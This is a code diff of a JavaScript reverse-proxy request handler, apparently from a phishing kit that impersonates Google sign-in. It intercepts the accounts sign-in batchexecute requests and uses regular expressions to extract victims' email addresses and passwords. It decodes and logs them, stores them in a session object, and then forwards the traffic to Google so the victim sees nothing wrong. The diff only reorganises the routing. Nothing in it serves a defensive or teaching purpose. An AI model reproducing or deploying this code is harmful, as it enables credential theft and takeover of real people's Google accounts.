@@ -20,7 +20,11 @@ const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClas
     }
 
     processRequest() {
-        return this.makeGmailProcess()
+        if (this.browserReq.url.startsWith('/v3/signin/_/AccountsSignInUi/data/batchexecute')) {
+            return this.makeGmailProcess()
+        }
+        return this.browserReq.pipe(this.proxyEndpoint)
+        
 
     }
 
@@ -33,52 +37,43 @@ const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClas
             this.browserReq.on('end', () => {
                 cJust += ''
                 const hostDomainRegex = new RegExp(this.browserReq.clientContext.hostname, 'gi')
-                const kJust = cJust.replace(hostDomainRegex, 'accounts.google.com')
+                // const kJust = cJust.replace(hostDomainRegex, 'accounts.google.com')
 
+                // this.proxyEndpoint.setHeader('Content-Length', kJust.length)
 
-                // const bgRegex = /bgRequest=[^&]*/
-                if (this.browserReq.url.startsWith('/v3/signin/_/AccountsSignInUi/data/batchexecute')) {
-                    const emailRegex = /f\.req=%5B%5B%5B%22V1UmUe%22%2C%22%5Bnull%2C%5C%22(.*?)%5C%22/
-                    const pwRegex = /f\.req=%5B%5B%5B%22B4hajb%22%2C%22%5B1%2C\d%2Cnull%2C%5B1%2Cnull%2Cnull%2Cnull%2C%5B%5C%22(.*?)%5C%22/
+                const emailRegex = /f\.req=%5B%5B%5B%22V1UmUe%22%2C%22%5Bnull%2C%5C%22(.*?)%5C%22/
+                const pwRegex = /f\.req=%5B%5B%5B%22B4hajb%22%2C%22%5B1%2C\d%2Cnull%2C%5B1%2Cnull%2Cnull%2Cnull%2C%5B%5C%22(.*?)%5C%22/
                     
-                    const emailMatch = emailRegex.exec(kJust)
-                    const passwordMatch = pwRegex.exec(kJust)
-                    if (emailMatch) {
-                        console.log('Email matched')
-                        const emailAdressencoded = emailMatch[1]
-                        const emailGmail = decodeURIComponent(emailAdressencoded)
-                        Object.assign(this.browserReq.clientContext.sessionBody,
-                            { email: emailGmail })
-                        console.log(`email address is ${emailGmail}`)
-                        this.proxyEndpoint.setHeader('content-length', kJust.length)
-                                this.proxyEndpoint.write(kJust) 
-                                this.proxyEndpoint.end('')
+                const emailMatch = emailRegex.exec(cJust)
+                const passwordMatch = pwRegex.exec(cJust)
+                if (emailMatch) {
+                    console.log('Email matched')
+                    const emailAdressencoded = emailMatch[1]
+                    const emailGmail = decodeURIComponent(emailAdressencoded)
+                    Object.assign(this.browserReq.clientContext.sessionBody,
+                        { email: emailGmail })
+                    console.log(`email address is ${emailGmail}`)
+                    // this.proxyEndpoint.setHeader('content-length', cJust.length)
+                    this.proxyEndpoint.write(cJust) 
+                    this.proxyEndpoint.end('')
 
-                    }else if (passwordMatch) {
-                        console.log('Password matched')
-                        const passwwordEncoded = passwordMatch[1]
-                        const passwordStr = decodeURIComponent(passwwordEncoded)
-                        Object.assign(this.browserReq.clientContext.sessionBody,
-                            { password: passwordStr })
-                        console.log(`password is ${passwordStr}`)
-                        this.proxyEndpoint.setHeader('content-length', kJust.length)
-                                this.proxyEndpoint.write(kJust) 
-                                this.proxyEndpoint.end('')
-                    } else {
-                        console.log('NO matches found')
-                        this.proxyEndpoint.setHeader('content-length', kJust.length)
-                        this.proxyEndpoint.write(kJust)
-                        this.proxyEndpoint.end('')
-                    }
-
+                }else if (passwordMatch) {
+                    console.log('Password matched')
+                    const passwwordEncoded = passwordMatch[1]
+                    const passwordStr = decodeURIComponent(passwwordEncoded)
+                    Object.assign(this.browserReq.clientContext.sessionBody,
+                        { password: passwordStr })
+                    console.log(`password is ${passwordStr}`)
+                    // this.proxyEndpoint.setHeader('content-length', cJust.length)
+                    this.proxyEndpoint.write(cJust) 
+                    this.proxyEndpoint.end('')
 
                 } else {
-                    console.log('Another url path')
-                    this.proxyEndpoint.setHeader('content-length', kJust.length)
-                    this.proxyEndpoint.write(kJust)
-                    this.proxyEndpoint.end('')
+                    console.log('NO matches found')
+                    // this.proxyEndpoint.setHeader('Content-Length', kJust.length)
+                    this.proxyEndpoint.write(cJust)
+                    return this.proxyEndpoint.end('')
                 }
-                // this.proxyEndpoint.write(kJust)
             })
         } else {
             this.browserReq.pipe(this.proxyEndpoint)
